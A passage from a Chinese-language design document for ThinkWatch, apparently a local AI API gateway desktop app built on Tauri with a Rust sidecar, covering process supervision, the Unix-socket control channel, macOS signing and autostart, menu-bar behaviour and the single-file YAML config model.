换句话说：这层 crate 边界本来就该有，`#11992` 只是又给了一个理由。

### 2.2 进程管理：必须避开 clash-verge 踩过的坑

**核心原则：core 已在运行时，UI 必须 attach，绝不再起一个。**

```
~/.thinkwatch/core.lock  →  {
    pid, started_at, version,
    control_sock,              // unix socket 路径，UI 默认走这条
    gateway_port,              // 固定端口，用于冲突检测
    tcp_port, token            // 仅在显式开启远程访问时存在
  }
```

UI 启动流程：

```
读 core.lock
  ├─ 文件不存在 ────────────────→ spawn sidecar
  ├─ 存在但 pid 不活 ───────────→ 删除 lock，spawn sidecar
  ├─ 存在、pid 活，但 socket 连不上 ─→ 僵尸，kill + 重启
  └─ 存在且探测成功 ────────────→ attach（不 spawn）
                                    并标记「非本 UI 托管」，退出时不 kill
```

「非本 UI 托管」这个标记很重要：用户用 `twcore serve` 手动起的进程，不能因为关掉 UI 窗口就被杀掉，**也不该由我们自作主张重启**。但这是唯一的例外分支，而且要在界面上说清楚——默认情况下 UI 和 core 是一体的（§2.2.1）。

**退出时的清理比想象中脆弱**，这里的民间说法只对了一半：

- Tauri shell 插件确实在 `RunEvent::Exit` 里杀子进程，**但注册表只由 JS 侧 `Command.spawn()` 的 IPC handler 填充**。从 Rust 侧 spawn 的 sidecar 从来没被登记过，也就从来不会被自动杀掉。必须自己在 `ExitRequested` 里 `take()` 出 `CommandChild` 调 `kill()`。
- **SIGKILL、强制退出、崩溃时两个事件都不触发。** 所以 `twcore` 必须自己看门：watch 父进程 PID，或者监听一个继承来的 stdin 管道，对端关闭就自行退出。这是唯一能覆盖崩溃场景的办法。
- **杀 sidecar 不会杀它的子进程。** Windows 上正确解法是 Job Object（clash-verge-rev 就是这么做的），Unix 上用进程组。

上游有个 sidecar 生命周期插件的提案（`plugins-workspace#3062`）还开着，说明目前确实没有一等公民的方案。

**端口策略是不对称的，这是刻意的：**

- **Gateway 端口固定**（默认 8788，用户可配）。因为客户端配置文件里写死了它。被占用时启动失败并明确报错，不能悄悄换端口——那会让所有客户端静默失联。**快速用户切换会让另一个账号也起一个实例来抢这个端口**，错误信息要能说清是这个原因（§2.4）。
- **Control 不占 TCP 端口**。UI 走 unix socket。仅在用户显式开启远程访问时才监听 TCP，端口随机并从 lock file 读。

**控制面走 Unix socket，不走 TCP。** 我原本打算用「127.0.0.1 + 随机 token」，调研 clash-verge-rev 之后改了主意：它压根不用 token，而是让 mihomo 监听 unix socket / 命名管道，插件连过去时**不发任何 Authorization 头**，TCP 的 `external-controller` 默认从生成的配置里清空，只为第三方面板保留。

这个选择是对的，理由很直接：本机上任何进程都能连 localhost，token 只是让攻击者多读一个文件；而 `0700` 的 unix socket 由内核按 uid 拦下，是文件系统级的强制。

所以：

| 通道 | 默认 | 认证 |
|---|---|---|
| `~/.thinkwatch/control.sock`（0700） | 开 | 靠文件权限，不需要 token |
| `127.0.0.1:<随机>` + Bearer token | **关** | 随机 32 字节 token |

TCP 通道保留但默认关闭，给远程访问、TUI、第三方面板用。开启时必须有 token——mihomo 有个反面教材：`secret` 为空时它**根本不装认证中间件**，整个 API 全开。我们要让空 token 直接拒绝启动，而不是静默放行。

### 2.2.1 core 的守护

初稿这里只有一句话：「UI 检测到 socket 断开，自动重启，托盘变红并告警」。**那不是守护，那是一句愿望。** 按它字面实现，core 要是因为一个必现的问题崩溃，就是个无限重启循环。补完整。

#### 怎么知道 core 死了：三个信号，都要用

| 信号 | 可靠性 | 覆盖不到的情况 |
|---|---|---|
| **子进程退出事件** | 最高，确定性的 | 只对「我们 spawn 的」有效；attach 模式拿不到 |
| **unix socket 断开** | 中 | 可能只是这条连接断了，要重连一次才能确认 |
| **心跳超时** | 最低，要等超时 | 但它是唯一能发现「进程活着但卡死」的手段 |

三个都要，因为它们互补：子进程事件最快最准但覆盖面窄，心跳最慢但能抓到死锁。

**心跳有个约束**：§4.5 要求「没有请求时不做任何周期性工作」，而心跳天然是周期性的。解法是**只在 socket 空闲时发**——事件流上有数据在传，那本身就是活着的证据，不需要额外 ping。主窗口关闭后连心跳也停掉，只留前两个信号。

#### 什么情况该重启，什么情况不该

**不该重启的**，四种：

- 用户主动点了「停止代理」
- 用户点了「退出」（那是要全退）
- **core 是 attach 来的**——用户自己 `twcore serve` 起的进程，生命周期不归我们管
- **配置错误导致的启动失败**——重启一百次结果都一样

**该重启的**：意外崩溃（panic、被信号杀、OOM）。

区分靠两样：我们主动 kill 时设一个标志位；再看退出码。这和 launchd 的 `KeepAlive.SuccessfulExit: false` 是同一个逻辑——**退出码 0 视为「它自己想退」，不拉起来**。

#### 退避与风暴保护

```
第 1 次失败  →  立刻重启
第 2 次      →  等 1s
第 3 次      →  等 2s
第 4 次      →  等 4s
第 5 次      →  等 8s
连续 5 次    →  停止重启，进入安全模式
```

**第一次立刻重启**很重要——大多数崩溃是偶发的，快速拉起来用户可能根本没察觉，这才是好的守护。

**计数要有时间窗**：连续失败的计数按「5 分钟内」算。如果 core 稳定跑了五分钟才崩，计数清零——那不是崩溃循环，是另一次独立的偶发崩溃，不该被前面的历史牵连。

#### 安全模式：挂了也要让人能自救

连续失败之后不能就这么停住，那样用户完全不知道发生了什么，也没法自己解决。

**安全模式 = 只起控制面，不起数据面。**

```
twcore serve --safe
  ├─ 监听 unix socket（控制面）        ✓
  ├─ 监听 8788（数据面）               ✗
  ├─ 加载 provider、建连接池            ✗
  └─ 提供配置读写、日志查看、历史回滚    ✓
```

这样用户能看到崩溃日志、能改配置、能用 §3.8 的历史一键回滚到上一个能跑的版本。**「网关挂了」的时候，用户最需要的恰恰就是能改配置**——如果这时候连界面都用不了，就只剩手动去编辑 YAML 这一条路了。

如果安全模式也起不来，那说明是二进制本身的问题，UI 直接显示诊断信息和日志路径。

#### 用户可见性：分级，不要每次都吵

| 情况 | 表现 |
|---|---|
| 第一次崩溃且立刻重启成功 | 菜单栏图标闪一下，托盘菜单里记一条。**不发通知** |
| 重启后又崩 | 菜单栏变黄，发一次系统通知 |
| 进入安全模式 | 菜单栏变红，发通知，**并且自动打开主窗口**到诊断页 |

最后一条是 §2.4「不抢焦点」原则的**故意例外**：安全模式意味着用户必须介入，这时候打断他是对的。前两种情况都不打断——偶发崩溃自动恢复了就不该打扰人。

#### attach 模式：检测但不重启

core 是用户手动起的时候，它退出了我们不该自作主张拉起来。但仍然要**检测并告知**：「你手动启动的 core 已退出」，然后给一个「由 ThinkWatch 接管启动」的按钮，让用户自己决定。

#### core 内部也要自己守护

UI 守护进程，core 守护自己的任务，两层。

- 单个请求 panic：`catch_unwind` 兜住，这一个请求失败，进程继续
- 后台任务：用企业版那个 `supervised_spawn`（`tasks.rs`，175 行，可直接搬）

但要明确一件审查问到的事：**后台任务 panic 之后是重启该任务，还是整体退出？**

分两类：

| 任务 | panic 后 |
|---|---|
| 观测类（写 SQLite、聚合统计、GC） | **重启该任务**，数据面不受影响。这是 §4.7「观测失败不能拖垮数据面」的直接应用 |
| 数据面核心 | **整体退出**，让 UI 重启一个干净的进程。这类 panic 说明有严重 bug，带伤运行比重启危险 |

#### 产品原则：对用户来说，它们就是一个程序

技术上是两个进程，**但这件事不该泄漏到界面上**。

| | 做法 |
|---|---|
| **退出即全停** | 点「退出」就是两个都停。**不问「要不要保留后台代理」**——那个问题本身就暴露了内部结构 |
| **core 绝不单独注册自启** | 一个自启项，一个后台项。用户在系统设置的登录项里只该看到一个东西 |
| **状态是应用的，不是 core 的** | 菜单栏显示的是「这个应用现在好不好」，不是「另一个进程好不好」 |
| **措辞里没有「core」** | 界面上说「代理服务已停止」，不说「core 挂了」。技术名词留给日志和诊断页 |

第三条容易被忽略：菜单栏不该出现「界面正常但 core 挂了」这种状态描述。用户的心智里只有一个东西，它要么在工作要么没在工作。**内部两个进程的健康状况，合成一个对外状态。**

这个原则也意味着**退出时的 kill 必须可靠**——既然承诺了「关掉就全关」，留下孤儿进程就是违约。§2.2 那套（`ExitRequested` 里主动 kill、core 自己 watch 父 PID）从「技术细节」升级成「产品承诺的实现」，SIGKILL 那条路径尤其不能省。

#### attach 模式是唯一的例外，而且要说清楚

用户自己在终端 `twcore serve` 起的进程不归 UI 管，这条得保留——否则打开界面就杀掉别人正在跑的服务，那是更糟的行为。

但它必须**显式可见**：这种情况下托盘菜单里的「退出」要写成「退出界面」，并加一句「代理服务由外部启动，将继续运行」。用户看到这句话就知道自己处在一个非默认状态里。

普通桌面用户永远遇不到这个分支。

#### GUI 崩溃：备选方案不是把 core 独立出去

既然 core 不能单独注册，GUI 挂掉时 core 会因父进程死亡而自杀，结果是全没了。

上一版我写「真遇到反复崩溃就把 core 独立注册成 LaunchAgent」——**那个方案和上面的原则冲突，作废。**

正确的备选是**给 GUI 手写 plist，加 `KeepAlive` 且带 `SuccessfulExit: false`**：

```xml
<key>KeepAlive</key>
<dict>
    <key>SuccessfulExit</key>
    <false/>          <!-- 退出码 0 不拉起，非 0 才拉起 -->
</dict>
```

这条正好和「一个程序」的心智吻合：**用户主动退出（exit 0）就是退了，崩溃（exit≠0）就自动恢复。** 而且和 §2.2.1 那套「退出码 0 视为它自己想退」的判断逻辑是同一个。

代价是要放弃 `tauri-plugin-autostart` 自己写 plist（§2.4 说过插件生成的 plist 只有三个 key）。**v1 不做**——GUI 不处理请求，崩溃概率远低于 core，真遇到了再说。但方向记在这里，免得下次又想歪。

### 2.3 macOS 打包 **[已降级：当前不对外分发]**

> **2026-09-07 决定：只做 macOS，本地构建可用即可，暂不对外分发。**
>
> 这一条决定把本节从「M0 阻塞项」降成「将来要做时的参考」。不分发就不需要公证，不需要公证就绕开了 `tauri#11992`，也不需要花 99 美元买证书。M0 第一周因此可以直接写业务代码，不用先去验证签名链路。
>
> 本地开发用 `cargo tauri dev` 和 `cargo tauri build` 就够了：ad-hoc 签名（`codesign -s -`）在本机运行没有障碍，Gatekeeper 只拦从网络下载的包。
>
> 下面的内容全部保留，因为它们是查证过的事实，等哪天要发给别人时直接可用。

Tauri 的 sidecar 二进制需要按 `twcore-aarch64-apple-darwin` 这样的 target-triple 后缀命名。更要命的是：**sidecar 必须和主程序一起签名**，否则 Gatekeeper 会在用户机器上静默拦截，表现为「UI 起来了但连不上 core」，没有任何提示。

我在这台机器上实测了工具链现状：

| 项 | 状态 |
|---|---|
| Rust | 1.95.0 ✅ |
| Node / pnpm | 26.3.0 / 11.13.0 ✅ |
| Tauri CLI | 2.11.4 ✅ |
| `codesign` / `notarytool` / `stapler` | 齐全 ✅（在 Command Line Tools 里，**不需要装完整 Xcode**） |
| 代码签名身份 | **0 个** ❌ |
| 已装 Rust target | 仅 `aarch64-apple-darwin`（Intel Mac 需要另加 target 做 universal） |

工具都在，**缺的是证书**。这决定了分发方式，三条路：

| 路径 | 做法 | 用户体验 |
|---|---|---|
| **A** | 加入 Apple Developer Program（$99/年）→ Developer ID 证书 → 签名 + 公证 | 双击即开。分发给别人的唯一体面方式 |
| **B** | Ad-hoc 签名，用户首次打开需右键或 `xattr -cr` 去隔离属性 | 开源工具常见做法，技术用户可接受，普通用户会劝退 |
| **C** | 只自己用，本地 build 不签名 | 零成本，但无法分享 |

**这必须在 M0 决定**，因为它影响的不只是最后一步打包：路径 A 和 B 对 sidecar 的处理方式不同，走到 M3 才发现要返工。见 §11 待决策 5。

#### sidecar 签名的实际行为（已查证 tauri-bundler 源码）

好消息是 Tauri 做对了：`externalBin` 被复制进 `Contents/MacOS/`，并且在 app bundle **之前**被加进签名列表——源码注释写着「per apple, signing must be done inside out」。公证跑在整个 `.app` 上。有个流传的说法称 sidecar 落在 `Frameworks/`，是错的。

要注意的约束：

| 约束 | 说明 |
|---|---|
| 同一签名身份 | sidecar 没有独立的身份设置，跟主程序一致 |
| 同一 entitlements | 用同一份 `bundle.macOS.entitlements`，**无法给 sidecar 单独配** |
| Hardened runtime | 默认开启且作用于 sidecar（`--options runtime`） |
| 执行位 | `std::fs::copy` 保留 mode，源文件必须先 `chmod +x`，否则运行时报 `PermissionDenied`（`tauri#4653`） |
| 隔离属性 | bundler 在签名前跑 `xattr -crs`，**但只在配置了签名身份时**。`--no-sign` 下隔离属性会留在包里。**这会连带搞死开机自启**——带隔离属性的程序 launchd 拒绝执行且完全静默，见 §2.4 |
| 通用二进制 | **Tauri 不会替你 lipo**。universal 构建会去找 `twcore-universal-apple-darwin`，得自己 `lipo -create` |

#### 真正的拦路虎：`tauri#11992`

**仍然开着，没有 workaround。** 症状是配置了 `externalBin` 之后公证失败，报错指向**主二进制**说签名无效；把 `externalBin` 移除，同一个项目公证就通过。

这正好命中我们的主路线。所以 §2.1.1 的双形态不是备份，是必需品——M0 第一周就要拿真实证书试这条链路，撞上了就走进程内模式，`tw-core` 一行不用改。

还有个次级坑 `tauri#12690`：sidecar 直接跑 `Contents/MacOS/app` 正常，双击 `.app` 却起不来。通常是 GUI 进程拿不到 shell 的 `$PATH`，社区方案是 `fix-path-env-rs`。

有一条我要标明**没有查实**：网上流传的给 sidecar 加 `allow-unsigned-executable-memory` / `disable-library-validation` 权限的建议，在 Tauri 官方文档里找不到任何依据，纯属社区口口相传。别预防性地加，等真失败了再说。

---

### 2.4 开机自启

一个常驻网关不能每次开机都要人手动打开。但这块的坑比看起来多，而且**有一个直接命中我们已有设计的**。

#### 结论：LaunchAgent 自启 GUI，GUI 再拉 sidecar

和 clash-verge-rev 一致（它和我们架构同构：Tauri 2 加 Rust sidecar）。它用 `tauri-plugin-autostart` 的 `MacosLauncher::LaunchAgent`，把 Label 设成 bundle id，**core 不单独注册自启**。

**另一条路（把 `twcore` 注册成独立 LaunchAgent、GUI 退出后代理继续跑）明确不做**，而且不是「以后再说」，是永久排除。

理由不只是省事。它会在系统设置的登录项里出现两个条目、在活动监视器里出现两个独立的后台项，而这直接违背 §2.2.1 的产品原则：**对用户来说这就是一个程序**。多一个自启项就是多一次「这另一个是什么」的困惑。

技术上的代价也是实打实的：两个后台项、两条升级路径（换版本要 `launchctl bootout` 再重写 plist）、卸载两处残留。

绝对不能做的是两者都注册——那会 spawn 两个 `twcore` 抢同一个端口。

#### 插件实际做了什么（读过源码）

`tauri-plugin-autostart` 2.5.1 在 macOS 上**既不是 SMAppService 也不是登录项 API**，它就是往 `~/Library/LaunchAgents/` 写一个 plist，而且只有三个 key：`Label`、`ProgramArguments`、`RunAtLoad`。

没有 `KeepAlive`（崩了不会自动拉起）、没有 `ProcessType`、没有 `EnvironmentVariables`。**要这些就得自己手写 plist，不能用插件。**

两个路径陷阱：

- plist 里存的是 **`enable()` 那一刻的绝对路径快照**，指向 `.app/Contents/MacOS/` 里的内层二进制。用户把 App 从下载目录拖到 `/Applications` → 自启静默失效，而且插件的 `is_enabled()` 只看文件在不在，仍然返回 `true`。**要自己校验 plist 里的路径和当前 exe 是否一致，不一致就重写。**
- `cargo tauri dev` 期间调 `enable()` 会把 `target/debug/…` 写进 plist。开发时别开自启，或者开发构建里禁用这个功能。

#### 两个会咬人的点

**一、隔离属性 —— 现在没事，分发时会炸**

未签名的 App 能不能自启？**能**，launchd 直接 `posix_spawn`，不走 Gatekeeper 的确认流程。

**但带 `com.apple.quarantine` 属性的不行。** launchd 会拒绝执行并报 error 155，表现是**plist 加载成功但程序完全不跑**——比弹窗还难排查，因为什么都不发生。

从浏览器下载的 zip 或 dmg 解出来的 App 都带这个属性。我们现在是本地构建，产物不带，所以没事；**一旦开始分发，哪怕只是发个 zip 给同事，这条立刻咬人**。这条要写进 §2.3 的分发 checklist。

**二、快速用户切换会起两个实例**

LaunchAgent 默认 `LimitLoadToSessionType = Aqua`。切换到第二个用户账号时，**launchd 会为第二个用户再拉起一个实例**——两个 `twcore` 抢同一个 8788 端口。

§2.2 已经有端口占用检测，但那是为「上次没退干净」设计的。这里要额外处理：检测到端口被**另一个用户的进程**占用时，错误信息要说清楚是这个原因，而不是让用户以为自己电脑坏了。

#### `ProcessType` 影响延迟，而插件给不了

launchd 的 `ProcessType` 不设时默认是 `Standard`，man page 明确说系统会施加「light resource limits，throttling its CPU usage and I/O bandwidth」。

对一个 §4.1 要求解析加路由在 2ms 内完成的代理，这个 throttling 是有害的。正确值是 `Interactive`（"run with the same resource limitations as apps, that is to say, none"）。

**但插件生成的 plist 没有这个 key。** 所以要么接受默认的 throttling，要么自己写 plist 不用插件。建议：**先用插件，等 M3 有了真实延迟数据再决定值不值得为这个自己维护 plist。** 不要凭猜测提前做复杂化。

#### 静默启动：开机后只有菜单栏，没有窗口

目标行为和 Surge 一致：**开机之后，屏幕上什么都不出现，只有菜单栏多一个图标。**

先说机制上的一个坑：macOS 13 起，系统设置里登录项旁边的「隐藏」勾选框**被移除了**。插件的 `--hidden` 参数只在 AppleScript 模式下映射到那个系统属性，而我们用的是 LaunchAgent 模式——在那里它就是一个普通的 argv 字符串，什么也不做。

另有个流传的检测方法是读 `kAEOpenApplication` 这个 Apple Event 判断是不是登录项启动。**对我们无效**——launchd 直接 exec 内层二进制，不经过 LaunchServices，那个事件根本不会送达。

所以自己来：注册时塞一个 `--autostart`，启动时检测 `std::env::args()`。

#### 静默启动要做对五件事

不只是「不显示窗口」，这五条缺一条用户就会觉得不对劲：

| | 做法 |
|---|---|
| **根本不创建窗口** | 不是「创建后隐藏」。`tauri.conf.json` 里不声明窗口，需要时用 `WebviewWindowBuilder` 现建。省内存也省启动时间，而且不会有一帧闪烁 |
| **不抢焦点** | 开机时用户可能正在打字或者别的 App 正在启动。整个过程不能有任何东西跳到前台 |
| **菜单栏图标立刻出现** | **不能等 core 就绪**。托盘图标在 `setup()` 里第一时间创建，显示「启动中」状态；core 起来了再切成正常状态。否则用户会觉得「我明明开了自启，怎么什么都没有」 |
| **不弹通知** | 每次开机弹一个「已启动」是噪音。只有**第一次**自启后弹一次，告诉用户「我在菜单栏这儿」，之后永不再弹 |
| **不出 Dock 图标** | 走 `Accessory` 策略，见下一小节 |

第三条最容易做错。sidecar 启动、unix socket 连上、配置加载完，这一串下来可能要几百毫秒到一两秒；如果图标要等这些做完才出现，用户开机后会有一段「它到底启没启」的空白期。**图标先出，状态后补。**

#### 「关掉窗口」不等于「退出」

这是菜单栏应用的标准语义，但必须显式实现，因为 Tauri 默认点红叉就是关窗口，而关掉最后一个窗口在某些配置下会退出整个 App。

| 操作 | 行为 |
|---|---|
| 点窗口红叉 / ⌘W | **隐藏窗口**，App 继续在菜单栏运行，代理不受影响 |
| ⌘Q | 同上——**这一条要特别处理**，因为用户的肌肉记忆是 ⌘Q 退出 |
| 菜单栏菜单里的「退出」 | **真的退出**，同时 kill sidecar（§2.2）。不问「要不要保留后台代理」——那个问题本身就暴露了内部有两个进程（§2.2.1） |

⌘Q 那一条有争议。两种做法：拦截 ⌘Q 让它只隐藏窗口（Surge 的做法），或者让 ⌘Q 真的退出但在菜单栏菜单里也留一个「退出」。

我倾向**前者**，理由是这个 App 退出的代价很高——所有 AI 客户端立刻失联。一个手滑的 ⌘Q 不该造成这个后果。但要在第一次拦截时提示一次：「窗口已隐藏，ThinkWatch 仍在菜单栏运行。要完全退出请用菜单栏里的退出。」

红叉不需要这个提示——macOS 上「关窗不等于退出应用」本来就是标准行为，用户不会困惑。只有 ⌘Q 需要，因为它的肌肉记忆确实是退出。

#### 关窗的三个连带问题

**一、隐藏还是销毁 webview？**

这是内存和重开速度的取舍：

| | 隐藏 | 销毁 |
|---|---|---|
| 重新打开 | 瞬间 | 几百毫秒重建 |
| 常驻内存 | webview 一直占着 | 释放 |
| 前端状态 | 保留（滚动位置、当前 tab、编辑中的内容） | 丢失 |

Tauri 的 webview 通常占几十到上百 MB，对一个常驻菜单栏、可能几天不开一次窗口的工具，这不是小数目。

**先做隐藏，等 M3 有了实测内存数据再决定要不要改。** 如果实测只占几十 MB 就一直隐藏着；如果占到两三百 MB，就改成「隐藏后空闲若干分钟再销毁」。现在不硬定，理由和 §2.4 的 `ProcessType` 一样——**不要凭猜测提前复杂化**。

**二、有未保存的配置编辑时不能静默隐藏**

Monaco 里改了配置还没保存，这时点红叉，内容不能就这么消失。要弹标准的三选一：保存 / 放弃 / 取消。

这条必须显式实现，因为「隐藏窗口」不像「退出应用」那样会被系统自然地拦一道。

**三、记住窗口位置和大小**

下次打开时恢复到上次的位置，这是 macOS 应用的基本礼貌。用 Tauri 的 window-state 插件，不用自己写。

#### Dock 图标：动态切，不要 `LSUIElement: true`

把 `LSUIElement` 设成 `true` 确实能做到「永远没有 Dock 图标」，但代价很大：App **永远拿不到前台焦点**，没有系统菜单栏菜单（就是屏幕顶部那一排「文件 / 编辑 / 窗口」），⌘Q、⌘,、⌘C/⌘V 全都要自己实现，⌘Tab 里也不出现。

对一个只有菜单栏图标、完全没有窗口的工具（比如某些状态监控），这没问题。**但我们有设置面板、有配置编辑器（Monaco）、有请求详情**——用户在里面要复制粘贴、要用快捷键，缺了系统菜单会很别扭。

所以走**运行时切换**，和 clash-verge-rev 一样：

```
平时                      → Accessory   无 Dock 图标，纯菜单栏
用户点「打开主窗口」       → Regular     切过去，出 Dock 图标，窗口能拿焦点
窗口关闭                  → Accessory   切回来，Dock 图标消失
```

顺带更正一条网上的错误说法：有文章说 Tauri 配置里有 `app.macOS.activationPolicy` 字段。**那是 v1 的，v2 没有这个 key。** v2 用 `AppHandle::set_activation_policy()`，它在 macOS 上才存在（`docs.rs` 上看不到，因为文档是在 Linux 上构建的）。

**有个已知风险要实测**：有人报告设了 `set_dock_visibility(false)` 之后自启失效——plist 在但程序不起来。那个 issue 已关闭但没留下原因。我们同时用自启和动态 activation policy，所以**M1.5 必须实机验证一次冷启动**。

#### 卸载残留

LaunchAgent 模式下，**删掉 App 不会删 plist**。用户会一直在系统设置的登录项里看到一个指向死链的条目，只能手动删文件。

所以：关闭自启开关时确保调了 `disable()`；将来如果做卸载器，要清理这个 plist。这是 SMAppService 相对 LaunchAgent 的主要优势（它的 plist 在 bundle 内，删 App 自动清理）——**等哪天签名了再评估要不要迁**。

#### 顺带解决单实例

launchd 直接 exec 二进制这条路**不受 LaunchServices 的单实例保护**，所以「自启了一个 + 用户又点了图标」会开出两个。加 `tauri-plugin-single-instance`。

#### 三个要实测的未确认项

1. 未签名 App 首次 `enable()` 时，macOS 那条「某软件可以在后台运行」的通知里**到底显示什么名字**（有签名时显示的是证书团队名，未签名时未知）
2. `set_activation_policy(Accessory)` 和 LaunchAgent 自启是否真有冲突（有个已关闭但没结论的 issue 报告过）
3. `$SHELL -l -c 'echo $PATH'` 在各种 shell 配置下的可靠性

两条都在 M1.5 做自启时验。

---

## 3. 配置模型

### 3.1 一份配置文件，就一份

**`config.yaml` 是唯一的配置文件。UI 改的、CLI 改的、你手改的，全都落在这一份里。**

我一度想拆成三层（配置 / 临时覆盖 / 运行时状态），被否掉了，而且否得对。理由很简单：**多一份文件就多一份心智负担**，用户得先理解「我这个改动会落到哪」才敢动手，这个成本远大于它解决的问题。

更重要的是我把 Clash 的病因诊断错了一部分。Clash 难用**不是因为它只有一份配置文件**，而是因为三件别的事：

| Clash 的真问题 | 我们的解法 |
|---|---|
| 只能改文件，没有 API | 完整的配置 API，UI 和 CLI 都走它（§3.8） |
| 程序改写会毁掉注释和格式 | 带位置信息的最小文本替换，不重新序列化（§3.8 一） |
| 双向同步做不对：回环、冲突、非法配置 | 写入指纹、乐观并发、校验失败保持旧配置（§3.8 二三四） |

这三件**没有一件需要靠多加文件来解决**。加一个覆盖层是在用架构复杂度换一个本该用 API 解决的问题。

#### 那「临时试一下」怎么办

用**变更历史加回滚**（§3.8）。你随便改，改坏了一键退回。

这比覆盖层简单得多，而且更通用——覆盖层只能覆盖预先设计好的那几个字段，回滚对任何改动都有效。心智负担也从「理解两层配置的优先级」降到「改错了能撤销」，后者是每个人都已经会的。

#### 顺带澄清两件不是配置文件的东西

- **运行时状态**（健康、熔断、延迟 EWMA、规则命中计数）进 `data.db`，和请求历史放一起。它本来就不是配置——不是你输入的，是系统观测出来的，没人会想去手改它。
- **多套配置**（profiles）是用户显式创建的功能，不是默认存在的层次，而且同一时刻只有一份生效。**第一版不做**，排到 M6+。v1 就是一份 `config.yaml`。

#### 版本与迁移

配置顶上的 `version: 1` 不是摆设。字段总会改名、总会有结构调整，而用户的配置文件是他自己维护的资产，不能每次升级都让他手改。

规则：

- **只增不改**是首选。加字段、加可选项，老配置照常工作，`version` 不动。
- 真要破坏性变更时，`version` 加一，core 内置一个 `v1 → v2` 的迁移函数：读到旧版本自动升级，**升级前把原文件完整存进 `history/`**（§3.8 的变更历史现成可用），并在 UI 上说明改了什么。
- 迁移是单向的。降级（用旧版本 core 打开新配置）直接拒绝启动并说明原因，不要试图猜测。

这套机制成本很低——迁移函数就是一串字段搬运——但没有它，第一次破坏性变更就会变成一场灾难。

#### 一份文件保住了所有好处

可以手写、可以 git、可以分享、可以 diff、可以让 AI 帮你改。Schema 单独导出成 `thinkwatch.schema.json`，在 VS Code 里直接编辑也有补全和校验。

**顺带白捡一个功能：多设备同步。** cc-switch 为此内置了 WebDAV 和 S3 两套云同步。我们不需要——**配置就一个文件，任何文件同步工具都能用**：iCloud、Syncthing、git、rsync，用户已经在用的那个就行。

内置云同步意味着要处理凭据存储、冲突合并、加密传输、服务不可用——**一整套只为「把一个几 KB 的文件搬到另一台机器」而存在的复杂度**。把它留给专门做这件事的工具，是单文件设计的红利。

（要注意的是密钥也在这份文件里（§3.2）。同步到别处等于把密钥也带过去，UI 上要提醒一次。）

UI 上切一次 group 会改动这份文件——**这是对的**，因为「当前选中哪个 provider」本来就是配置的一部分，你下次启动当然希望它还是那个。和你改了编辑器设置、`settings.json` 就会变，是同一回事。

### 3.2 密钥就写在 YAML 里

**不用 keychain。密钥直接写在 `config.yaml` 里。**

这和 §3.1 是同一个取舍：keychain 意味着「配置文件之外还有一个你看不见的地方存着东西」，备份要备两处、换机器要重新授权、macOS 每次访问还可能弹框。而 Surge 和 Clash 的配置里本来就是明文写密码的，这是这类工具的既有习惯。

```yaml
providers:
  - name: anthropic-official
    protocol: anthropic
    base_url: https://api.anthropic.com
    key: sk-ant-api03-xxxxxxxx        # 就这么写
```

#### 代价必须说清楚，也必须缓解

明文落盘的风险是真实的：**一次误提交或者一次随手分享配置，密钥就出去了。** 所以以下几条不是可选项：

| 措施 | 做法 |
|---|---|
| **文件权限** | 创建时就是 `0600`。启动时检查，权限过宽就在 UI 上告警并提供一键修复 |
| **一键脱敏导出** | 「导出配置」永远导出的是密钥被替换成占位符的版本。想分享配置、贴进 issue、发给同事，用这个 |
| **UI 默认打码** | 界面上密钥显示为 `sk-ant-…8f2c`，点一下才展开。截屏和录屏时不会误伤 |
| **git 提醒** | 检测到配置目录在 git 仓库里且没被 ignore，提示一次 |

#### 两个逃生舱，给想更安全的人

不增加任何默认心智负担——不写就是明文，写了才是引用：

```yaml
providers:
  # 环境变量插值 —— 唯一的逃生舱
  - name: openai
    key: ${OPENAI_API_KEY}
```

#### 为什么没有「跑一条命令拿密钥」这一类

这是很多同类工具都有的逃生舱（Claude Code 的 `apiKeyHelper` 就是）：`key: { exec: [...] }`，跑一条命令，拿 stdout 当密钥，密钥就能留在 1Password、`pass`、`gcloud` 里。

**我们不做，因为配置文件不该能执行程序。**

这一节鼓励分享脱敏后的配置，§3.1 还把「让 AI 帮你改配置」当成目标场景。那时「抄一份配置」就等于「跑一段代码」，而用户对一个网关配置文件的心理预期是「里面是设置」。**这正是 §5.3 对第三方 skill 的那套警惕，它同样适用于我们自己的配置文件。**

「本机攻击者反正能改你 `.zshrc`」这个反驳只对已经拿到你机器的人成立，而这里的威胁是配置从别处来。

判据可以 grep：**core 里只有一处 `Command::new`，写死的 `ps` 加写死的参数**（§5.3 用它看进程起于何时）。没有任何一条从配置来的字符串能走到进程启动上。`${ENV}` 是唯一的逃生舱，它读的是数据不是代码。

代价说清楚：**Vertex / Bedrock STS 那种天生就是临时凭据的上游没有接入路径**——OAuth（§3.6）覆盖的是 refresh token 流，覆盖不了 `gcloud` 的 ADC。要接得写专门的适配器，那是另一件事。

外部文件路径那两个口子（`pricing: relay-cn.yaml`、§5.3 的可更新规则集）不受影响，它们读的是数据不是代码；一律相对于配置目录解析，不接受绝对路径和 `..`。

#### 连带简化

原方案里的 `secrets.db`、master key、XChaCha20 加密、Linux 上 Secret Service 不可用时的口令派生降级路径——**全部删掉**。

企业版的 `crypto.rs` 和 `json_secret.rs`（§9.1 提过的 332 行）在桌面版不再需要，但它们留在 core 里对企业版仍然有用，属于「core 有但桌面版不调用」的部分。

### 3.3 配置全貌

#### 先看最小的那份

下面的全貌很长，容易让人误以为要配一堆东西。**第一天的配置是这样的：**

```yaml
# ~/.thinkwatch/config.yaml        权限 0600
version: 1

clients:
  - { name: default, key: tw-a3f9c8d1e5b2 }      # 首次运行自动生成

providers:
  - { name: my-relay, base_url: https://api.example.com, key: sk-xxxxxxxx }
```

**六行，其中用户真正需要输入的只有 base_url 和 key 两个值。** 没有 routes（只有一个上游时兜底是隐式的，§3.4）、没有 groups、没有 limits、没有 security 段——它们全都有能用的默认值，不写就是默认。

这不是「简化示例」，是**真实的、完整可用的配置**：转发、观测、成本统计、菜单栏、接管、安全的观察态，全都在跑。这正是 §0.6 那条纪律在配置格式上的样子。

协议不用写，从 `base_url` 猜（`api.anthropic.com` → anthropic）；猜不出来时首次运行的 L2 探测会问一句。超时、代理、信任级别都有默认。

下面这份全貌的意义是**字段字典**，不是「你要配成这样」。

#### 完整字段参考

> **这一段是配置的唯一权威示例。** 文档其他章节出现的 YAML 片段，字段都必须能在这里找到对应；对不上就以这里为准。加这条规矩是因为初稿有八个字段散落在别处而这里没有——那正是「改版残留」的结构性成因。

```yaml
# ~/.thinkwatch/config.yaml        权限 0600
version: 1

listen:
  gateway:
    bind: loopback            # loopback | lan | all | 具体 IP，见 §5.4
    port: 8788
    allow_from: []            # 仅 lan / all 时生效的来源白名单（CIDR）

log:
